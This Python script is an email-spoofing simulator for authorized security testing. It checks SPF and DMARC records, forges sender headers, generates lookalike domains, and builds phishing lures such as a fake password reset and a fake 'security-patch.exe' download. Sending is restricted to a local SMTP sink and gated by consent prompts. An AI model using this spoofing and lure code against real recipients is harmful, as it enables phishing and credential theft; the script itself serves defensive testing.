#!/usr/bin/env python3
"""
Email Spoofing Attack Simulator (MITRE ATT&CK T1672 - AiTM)
For Authorized Security Testing Only

SAFE MODE:
 - This script is a SIMULATOR. It will NOT send email to external recipients
   unless you explicitly configure it to use a local SMTP sink (localhost / 127.0.0.1).
 - If you choose "full-spoofing" mode, the script will only perform real SMTP
   sends when SMTP server is localhost and you confirm "LOCAL_ONLY".
 - Use MailHog or Python's DebuggingServer to capture test messages locally.
"""

import json
import os
import sys
import time
import random
import signal
import smtplib
import dns.resolver
from datetime import datetime
from dataclasses import dataclass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class EmailSpoofConfig:
    target_domain: str
    spoofed_domains: list
    victim_emails: list
    attack_type: str
    mode: str
    smtp_server: str
    smtp_port: int
    test_subject: str
    max_emails: int
    worker_threads: int
    log_dir: str
    responsible_party: str
    emergency_stop_file: str
    allow_local_smtp_send: bool = False  # safety flag

class EmailSpoofSimulator:
    def __init__(self):
        self.config = None
        self.run_id = f"emailspoof{int(time.time())}"
        self.start_time = None
        self.stop_flag = False
        self.attempt_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.spoofed_emails = []
        self.dns_records = []
        self.lock = threading.Lock()  # protect counters and shared lists

    def get_user_input(self) -> EmailSpoofConfig:
        print("=== EMAIL SPOOFING ATTACK SIMULATOR ===")
        print("MITRE ATT&CK T1672 - Adversary-in-the-Middle (Email Spoofing)")
        print("⚠️ Authorized Use Only – Requires Written Permission")
        print("=" * 65)

        permission = input("Type 'I_HAVE_WRITTEN_PERMISSION' to confirm: ").strip()
        if permission != "I_HAVE_WRITTEN_PERMISSION":
            print("❌ Written permission confirmation failed!")
            sys.exit(1)

        target_domain = input("Enter target domain to spoof [e.g., company.com]: ").strip()

        spoofed_input = input("Enter domains to spoof (comma-separated): ").strip()
        spoofed_domains = [domain.strip() for domain in spoofed_input.split(',') if domain.strip()]

        victim_input = input("Enter victim email addresses (comma-separated): ").strip()
        victim_emails = [email.strip() for email in victim_input.split(',') if email.strip()]

        attack_type = input("Attack type (direct-spoofing/reply-to-spoofing/display-name/domain-impersonation): ").strip().lower()
        if attack_type not in ['direct-spoofing', 'reply-to-spoofing', 'display-name', 'domain-impersonation']:
            print("❌ Invalid attack type!")
            sys.exit(1)

        mode = input("Run mode (dns-check/header-analysis/full-spoofing): ").strip().lower()
        if mode not in ['dns-check', 'header-analysis', 'full-spoofing']:
            print("❌ Invalid mode selected!")
            sys.exit(1)

        smtp_server = input("SMTP server [default localhost]: ").strip() or "localhost"
        try:
            smtp_port = int(input("SMTP port [default 1025]: ").strip() or "1025")
            max_emails = int(input("Max emails to simulate/send [default 10]: ").strip() or "10")
            worker_threads = int(input("Worker threads [default 2]: ").strip() or "2")
        except ValueError:
            print("❌ Invalid numeric input!")
            sys.exit(1)

        test_subject = input("Test email subject [default Security Test]: ").strip() or "Security Test"

        log_dir = input("Log directory [default ./email_spoof_logs]: ").strip() or "./email_spoof_logs"
        os.makedirs(log_dir, exist_ok=True)

        responsible_party = input("Tester name & contact: ").strip()
        emergency_stop_file = input("Emergency stop file [default ./STOP_EMAIL]: ").strip() or "./STOP_EMAIL"

        # Safety: only allow real sends if SMTP server is local
        allow_local_smtp_send = False
        if mode == "full-spoofing":
            if smtp_server not in ("localhost", "127.0.0.1"):
                print("\n⚠️ For safety, full-spoofing mode only allows LOCAL SMTP (localhost / 127.0.0.1).")
                print("Change SMTP server to localhost or run in dns-check/header-analysis mode.")
                sys.exit(1)
            confirm_local = input("Type 'LOCAL_ONLY' to allow sending to local SMTP sink: ").strip()
            if confirm_local == "LOCAL_ONLY":
                allow_local_smtp_send = True
            else:
                print("❌ Did not confirm LOCAL_ONLY. Aborting full-spoofing real send.")
                sys.exit(1)

        return EmailSpoofConfig(
            target_domain=target_domain,
            spoofed_domains=spoofed_domains,
            victim_emails=victim_emails,
            attack_type=attack_type,
            mode=mode,
            smtp_server=smtp_server,
            smtp_port=smtp_port,
            test_subject=test_subject,
            max_emails=max_emails,
            worker_threads=worker_threads,
            log_dir=log_dir,
            responsible_party=responsible_party,
            emergency_stop_file=emergency_stop_file,
            allow_local_smtp_send=allow_local_smtp_send
        )

    def check_dns_records(self, domain: str):
        """Check DNS records for email security (SPF, DKIM, DMARC)"""
        print(f"[*] Checking DNS records for {domain}...")
        dns_checks = []

        # SPF
        try:
            spf_answers = dns.resolver.resolve(domain, 'TXT')
            spf_record = None
            for rdata in spf_answers:
                txt = str(rdata)
                if 'v=spf1' in txt.lower():
                    spf_record = txt
                    break
            spf_status = "found" if spf_record else "not_found"
            dns_checks.append({
                "domain": domain,
                "record_type": "SPF",
                "status": spf_status,
                "record": spf_record,
                "vulnerable": spf_status == "not_found" or (spf_record and ("~all" in spf_record or "?all" in spf_record))
            })
        except Exception:
            dns_checks.append({
                "domain": domain,
                "record_type": "SPF",
                "status": "not_found",
                "record": None,
                "vulnerable": True
            })

        # DMARC
        try:
            dmarc_answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            dmarc_record = None
            for rdata in dmarc_answers:
                txt = str(rdata)
                if 'v=DMARC1' in txt:
                    dmarc_record = txt
                    break
            dmarc_status = "found" if dmarc_record else "not_found"
            dns_checks.append({
                "domain": domain,
                "record_type": "DMARC",
                "status": dmarc_status,
                "record": dmarc_record,
                "vulnerable": dmarc_status == "not_found" or (dmarc_record and "p=none" in dmarc_record)
            })
        except Exception:
            dns_checks.append({
                "domain": domain,
                "record_type": "DMARC",
                "status": "not_found",
                "record": None,
                "vulnerable": True
            })

        # MX
        try:
            mx_answers = dns.resolver.resolve(domain, 'MX')
            mx_records = [str(rdata.exchange).rstrip('.') for rdata in mx_answers]
            dns_checks.append({
                "domain": domain,
                "record_type": "MX",
                "status": "found",
                "records": mx_records,
                "vulnerable": False
            })
        except Exception:
            dns_checks.append({
                "domain": domain,
                "record_type": "MX",
                "status": "not_found",
                "records": [],
                "vulnerable": True
            })

        for check in dns_checks:
            with self.lock:
                self.dns_records.append(check)
            vuln_status = "🔴 VULNERABLE" if check["vulnerable"] else "🟢 SECURE"
            print(f"[+] {check['record_type']} for {domain}: {check['status']} - {vuln_status}")

        return dns_checks

    def generate_spoofed_email(self, victim: str, spoofed_domain: str, attack_type: str):
        """Generate spoofed email based on attack type (returns dict)."""
        common_names = ["john.doe", "jane.smith", "michael.brown", "sarah.wilson", "david.jones"]
        domains = [spoofed_domain, "gmail.com", "hotmail.com", "yahoo.com"]

        if attack_type == "direct-spoofing":
            from_email = f"admin@{spoofed_domain}"
            from_name = "Admin"
            reply_to = None
        elif attack_type == "reply-to-spoofing":
            from_email = f"noreply@{random.choice(domains)}"
            from_name = "Notification System"
            reply_to = f"admin@{spoofed_domain}"
        elif attack_type == "display-name":
            from_email = f"{random.choice(common_names)}@{random.choice(domains)}"
            from_name = f"CEO <ceo@{spoofed_domain}>"
            reply_to = None
        elif attack_type == "domain-impersonation":
            impersonated_domain = spoofed_domain.replace('.com', '.co').replace('.org', '.og')
            from_email = f"security@{impersonated_domain}"
            from_name = "Security Team"
            reply_to = None
        else:
            from_email = f"test@{spoofed_domain}"
            from_name = "Test User"
            reply_to = None

        templates = [
            {
                "subject": "Urgent: Password Reset Required",
                "body": f"""Dear User,

We've detected suspicious activity on your account. Please reset your password immediately by clicking the link below:

Reset Link: http://{spoofed_domain}/reset-password

If you did not request this change, please contact our support team immediately.

Best regards,
IT Security Team
{spoofed_domain}
"""
            },
            {
                "subject": "Important: Security Update Required",
                "body": f"""Hello,

Your account requires an immediate security update. Please review the attached document and follow the instructions.

Download: http://update.{spoofed_domain}/security-patch.exe

This is a mandatory update for all employees.

Regards,
IT Department
{spoofed_domain}
"""
            },
            {
                "subject": "Invoice Payment Required",
                "body": f"""Dear Customer,

Please find your invoice attached. Payment is due within 7 days.

Invoice: http://billing.{spoofed_domain}/invoice.pdf

If you have any questions, please contact our billing department.

Thank you,
Accounting Team
{spoofed_domain}
"""
            }
        ]

        template = random.choice(templates)

        return {
            "from_email": from_email,
            "from_name": from_name,
            "reply_to": reply_to,
            "to_email": victim,
            "subject": template["subject"],
            "body": template["body"],
            "attack_type": attack_type,
            "timestamp": datetime.now().isoformat()
        }

    def _build_mime_message(self, email_data: dict) -> MIMEMultipart:
        msg = MIMEMultipart()
        # e.g., Header('Admin', 'utf-8')
        from_header = f"{email_data['from_name']} <{email_data['from_email']}>"
        msg['From'] = from_header
        msg['To'] = email_data['to_email']
        msg['Subject'] = Header(email_data['subject'], 'utf-8')
        msg['Date'] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S %z")
        if email_data['reply_to']:
            msg.add_header('Reply-To', email_data['reply_to'])
        msg.attach(MIMEText(email_data['body'], "plain"))
        return msg

    def simulate_email_sending(self, email_data: dict):
        """Simulate or actually send message (safe — only to local SMTP if allowed)."""
        # Check emergency stop or limits
        if self.check_stop_conditions():
            return None

        with self.lock:
            attempt_id = f"email_{self.attempt_count:04d}"
            self.attempt_count += 1

        try:
            mode = self.config.mode
            if mode == "full-spoofing" and self.config.allow_local_smtp_send:
                # Build MIME message
                msg = self._build_mime_message(email_data)
                try:
                    # Connect to local SMTP sink (no auth) — intended for MailHog / DebuggingServer
                    with smtplib.SMTP(host=self.config.smtp_server, port=self.config.smtp_port, timeout=10) as s:
                        s.sendmail(email_data['from_email'], [email_data['to_email']], msg.as_string())
                    success = True
                    error_msg = None
                except Exception as e:
                    success = False
                    error_msg = f"Local SMTP send error: {e}"
            else:
                # Simulation / dry-run: don't perform any network activity
                success = True
                error_msg = None

            email_event = {
                "attempt_id": attempt_id,
                "timestamp": datetime.now().isoformat(),
                "from_email": email_data["from_email"],
                "from_name": email_data["from_name"],
                "reply_to": email_data["reply_to"],
                "to_email": email_data["to_email"],
                "subject": email_data["subject"],
                "attack_type": email_data["attack_type"],
                "result": "success" if success else "failed",
                "error_message": error_msg,
                "mode": mode
            }

            with self.lock:
                if success:
                    self.success_count += 1
                    print(f"[+] (simulated/send) {email_data['from_email']} -> {email_data['to_email']}")
                else:
                    self.failed_count += 1
                    print(f"[-] (failed) {email_data['from_email']} -> {email_data['to_email']} ({error_msg})")
                self.spoofed_emails.append(email_event)

            return email_event

        except Exception as e:
            error_event = {
                "attempt_id": attempt_id,
                "timestamp": datetime.now().isoformat(),
                "from_email": email_data.get("from_email"),
                "to_email": email_data.get("to_email"),
                "result": "error",
                "error_message": str(e)
            }
            with self.lock:
                self.spoofed_emails.append(error_event)
                self.failed_count += 1
            print(f"[!] Email spoofing error: {e}")
            return error_event

    def analyze_email_headers(self):
        """Analyze email headers for spoofing vulnerabilities (no network activity)."""
        print("[*] Analyzing email header vulnerabilities...")
        header_checks = [
            {"header": "From", "vulnerability": "Direct spoofing", "risk": "High",
             "description": "From header can be forged without authentication"},
            {"header": "Reply-To", "vulnerability": "Reply-to spoofing", "risk": "Medium",
             "description": "Reply-To header can differ from From header"},
            {"header": "Return-Path", "vulnerability": "Bounce spoofing", "risk": "Low",
             "description": "Return-Path can be set to attacker-controlled address"},
            {"header": "Message-ID", "vulnerability": "ID spoofing", "risk": "Low",
             "description": "Message-ID can be forged to appear legitimate"}
        ]
        for check in header_checks:
            event = {
                "timestamp": datetime.now().isoformat(),
                "event_type": "header_analysis",
                "header": check["header"],
                "vulnerability": check["vulnerability"],
                "risk_level": check["risk"],
                "description": check["description"]
            }
            with self.lock:
                self.spoofed_emails.append(event)
            print(f"[+] Header Analysis: {check['header']} - {check['risk']} risk - {check['vulnerability']}")

    def check_domain_impersonation(self):
        """Check for domain impersonation possibilities (typosquatting heuristics)."""
        print("[*] Checking domain impersonation possibilities...")
        original_domain = self.config.target_domain
        impersonations = []
        variations = [
            original_domain.replace('.com', '.cm'),
            original_domain.replace('.com', '.co'),
            original_domain.replace('.org', '.og'),
            original_domain.replace('.net', '.ne'),
            original_domain + 's',
            'www-' + original_domain,
            original_domain.replace('.', '-') + '.com'
        ]
        for variant in variations:
            if 1 <= len(variant) < 50:
                impersonations.append({
                    "original": original_domain,
                    "impersonation": variant,
                    "type": "typo_squatting",
                    "risk": "High"
                })
                with self.lock:
                    self.spoofed_emails.append({
                        "timestamp": datetime.now().isoformat(),
                        "event_type": "domain_impersonation",
                        "original": original_domain,
                        "impersonation": variant,
                        "risk": "High"
                    })
                print(f"[!] Domain Impersonation: {original_domain} -> {variant}")
        return impersonations

    def signal_handler(self, signum, frame):
        print("\n🛑 Received termination signal, stopping gracefully...")
        self.stop_flag = True

    def check_stop_conditions(self):
        if os.path.exists(self.config.emergency_stop_file):
            print(f"🛑 Emergency stop file detected: {self.config.emergency_stop_file}")
            return True
        with self.lock:
            if self.attempt_count >= self.config.max_emails:
                print("ℹ️ Max email count reached.")
                return True
        return self.stop_flag

    def display_attack_summary(self):
        print("\n" + "="*70)
        print("MITRE ATT&CK T1672 - ADVERSARY-IN-THE-MIDDLE (Email Spoofing)")
        print("="*70)
        print("Tactic: Initial Access, Credential Access")
        print("Platform: Email Systems")
        print("Description: Adversary spoofs email addresses to appear as")
        print("legitimate senders, bypassing authentication mechanisms.")
        print("\nCommon Email Spoofing Techniques:")
        print("  • Direct From-header spoofing")
        print("  • Reply-To header manipulation")
        print("  • Display Name deception")
        print("  • Domain impersonation/typosquatting")
        print("  • Lack of SPF/DKIM/DMARC enforcement")
        print("="*70)

    def run_attack(self):
        print(f"\n🚀 Starting Email Spoofing Simulation (T1672)")
        self.display_attack_summary()

        self.start_time = datetime.now()
        signal.signal(signal.SIGINT, self.signal_handler)

        print(f"\n[*] Configuration:")
        print(f"    Target Domain: {self.config.target_domain}")
        print(f"    Spoofed Domains: {', '.join(self.config.spoofed_domains)}")
        print(f"    Victim Emails: {', '.join(self.config.victim_emails)}")
        print(f"    Attack Type: {self.config.attack_type}")
        print(f"    Mode: {self.config.mode}")

        # DNS Security Checks
        print(f"\n[*] Performing DNS Security Checks...")
        for domain in [self.config.target_domain] + self.config.spoofed_domains:
            self.check_dns_records(domain)

        # Email Header Analysis
        if self.config.mode in ["header-analysis", "full-spoofing"]:
            print(f"\n[*] Performing Email Header Analysis...")
            self.analyze_email_headers()

        # Domain Impersonation Check
        print(f"\n[*] Checking Domain Impersonation Possibilities...")
        self.check_domain_impersonation()

        # Email Spoofing Simulation / Local sending
        if self.config.mode == "full-spoofing":
            print(f"\n[*] Starting Email Spoofing Simulation (LOCAL only)...")
            with ThreadPoolExecutor(max_workers=self.config.worker_threads) as executor:
                futures = []
                for victim in self.config.victim_emails:
                    for spoofed_domain in self.config.spoofed_domains:
                        if self.check_stop_conditions():
                            break
                        email_data = self.generate_spoofed_email(victim, spoofed_domain, self.config.attack_type)
                        futures.append(executor.submit(self.simulate_email_sending, email_data))
                        time.sleep(0.2)  # small rate limit
                for future in as_completed(futures):
                    if self.check_stop_conditions():
                        break
                    _ = future.result()

        self.cleanup()

    def cleanup(self):
        end_time = datetime.now()
        duration = (end_time - self.start_time).total_seconds() if self.start_time else 0

        with self.lock:
            vulnerable_dns = len([r for r in self.dns_records if r.get('vulnerable', False)])
            total_dns_checks = len(self.dns_records)
            security_score = 100 - (vulnerable_dns / max(total_dns_checks, 1) * 100)
            success_rate = (self.success_count / max(self.attempt_count, 1)) * 100

        summary = {
            "run_id": self.run_id,
            "technique": "T1672 - Email Spoofing (AiTM)",
            "target_domain": self.config.target_domain,
            "attack_type": self.config.attack_type,
            "mode": self.config.mode,
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "end_time": end_time.isoformat(),
            "duration_sec": duration,
            "total_attempts": self.attempt_count,
            "successful_spoofs": self.success_count,
            "failed_spoofs": self.failed_count,
            "dns_checks_performed": total_dns_checks,
            "vulnerable_dns_records": vulnerable_dns,
            "security_score": security_score,
            "success_rate": success_rate
        }

        summary_path = os.path.join(self.config.log_dir, f"{self.run_id}_summary.json")
        with open(summary_path, 'w') as f:
            json.dump(summary, f, indent=2)

        log_path = os.path.join(self.config.log_dir, f"{self.run_id}_events.jsonl")
        with open(log_path, 'w') as f:
            with self.lock:
                for entry in self.spoofed_emails:
                    f.write(json.dumps(entry) + "\n")

        dns_path = os.path.join(self.config.log_dir, f"{self.run_id}_dns.json")
        with open(dns_path, 'w') as f:
            json.dump(self.dns_records, f, indent=2)

        print("\n✅ Email Spoofing Simulation Completed")
        print(f"📊 Total Attempts: {self.attempt_count}")
        print(f"✅ Successful (simulated/sent): {self.success_count}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"🔍 DNS Checks: {total_dns_checks} (Vulnerable: {vulnerable_dns})")
        print(f"🛡️ Security Score: {security_score:.1f}%")
        print(f"📁 Logs saved to: {os.path.abspath(self.config.log_dir)}")

        if vulnerable_dns > 0 or self.success_count > 0:
            print("\n🔴 CRITICAL FINDINGS:")
            print("   Email spoofing vulnerabilities detected!")
            print("   Recommendations:")
            print("   • Implement SPF records with -all (strict)")
            print("   • Deploy DKIM email signing")
            print("   • Configure DMARC with p=reject or p=quarantine")
            print("   • Train users to identify spoofed emails")
            print("   • Use email authentication and filtering")
            print("   • Monitor for domain impersonation attempts")

        if security_score < 70:
            print(f"\n⚠️ SECURITY WARNING: Domain {self.config.target_domain} has poor email security configuration!")

    def run(self):
        self.config = self.get_user_input()

        today = datetime.now().strftime("%Y-%m-%d")
        expected_token = f"START-{self.config.target_domain}-{today}"
        print(f"\n--- Final Consent Token ---")
        print(f"You MUST type exactly: {expected_token}")
        user_token = input("Type the token: ").strip()

        if user_token != expected_token:
            print("❌ Consent token mismatch! Aborting.")
            sys.exit(1)

        self.run_attack()

if __name__ == "__main__":
    simulator = EmailSpoofSimulator()
    simulator.run()
